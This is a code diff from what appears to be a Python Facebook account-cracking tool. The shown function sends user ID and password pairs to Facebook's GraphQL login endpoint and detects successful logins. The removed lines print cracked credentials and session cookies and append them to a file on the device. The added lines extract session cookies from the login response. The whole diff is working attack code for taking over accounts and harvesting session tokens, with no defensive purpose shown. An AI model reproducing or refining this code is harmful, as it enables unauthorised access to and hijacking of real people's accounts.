@@ -1330,12 +1330,14 @@ def mbasic(uid,pwx,tl):
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://graph.facebook.com/graphql', data=encode)
             if "session_key" in response.text and "uid" in response.text:
-                print(f" {green}(ATOM-OK) {uid}|{pw}")
-                cookie = '; '.join([f'{k}={v}' for k, v in Session.cookies.get_dict().items()])
-                print(f" {green}(ATOM-coki) {cookie} ")
-                open("/sdcard/SUMON_file_ok1.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                oks.append(uid)
-                break
+                cookie_raw = re.sub(r'\\(?!/)', '', response.text)
+                match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
+                if match:
+                      cookies_raw = match.group(1)
+                      cookies_json = json.loads(cookies_raw)
+                      cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
+                else:
+                   continue
             elif "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 print(f" {green}(ATOM-OK) {uid}|{pw}")
                 cookie = '; '.join([f'{k}={v}' for k, v in Session.cookies.get_dict().items()])
